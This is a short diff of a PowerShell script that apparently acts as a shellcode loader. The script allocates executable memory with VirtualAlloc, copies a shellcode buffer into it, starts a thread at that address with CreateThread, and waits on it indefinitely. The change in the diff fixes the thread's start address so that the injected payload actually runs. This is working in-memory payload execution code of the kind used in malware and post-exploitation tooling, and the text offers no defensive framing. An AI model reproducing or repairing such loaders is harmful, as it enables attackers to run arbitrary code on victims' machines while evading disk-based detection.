@@ -70,7 +70,7 @@ $MemoryHandle = $VirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40);
 [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $MemoryHandle, $size) | Out-Null
 
 # Create a thread and execute the shellcode
-$ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $PEHandle, [IntPtr]::Zero, ([UInt32]0), ([IntPtr]0)) | Out-Null
+$ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, ([UInt32]0), ([IntPtr]0)) | Out-Null
 
 # Make the thread run forever
 $WaitForSingleObject.Invoke(([IntPtr]$ThreadHandle), [uint32]"0xFFFFFFFF") | Out-Null
